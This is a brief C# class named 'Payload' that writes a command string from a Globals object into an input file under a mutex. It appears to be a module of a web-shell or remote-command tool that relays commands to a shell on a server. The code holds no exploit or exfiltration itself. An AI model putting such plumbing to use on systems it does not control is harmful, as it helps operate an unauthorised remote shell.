using System;
using System.Web;
using System.IO;
using System.Text;
using System.Runtime.Serialization;
using System.Threading;
using System.Diagnostics;

public class Payload
{
    public static string run()
    {
        Directory.SetCurrentDirectory(Globals.pwd);
        if(File.Exists(Globals.infile)){
            Mutex mut = new Mutex(false, "test123");
            mut.WaitOne();
            File.WriteAllText(Globals.infile, Globals.cmd);
            mut.ReleaseMutex();
            return "1";
        }
        return "-1";
    }
}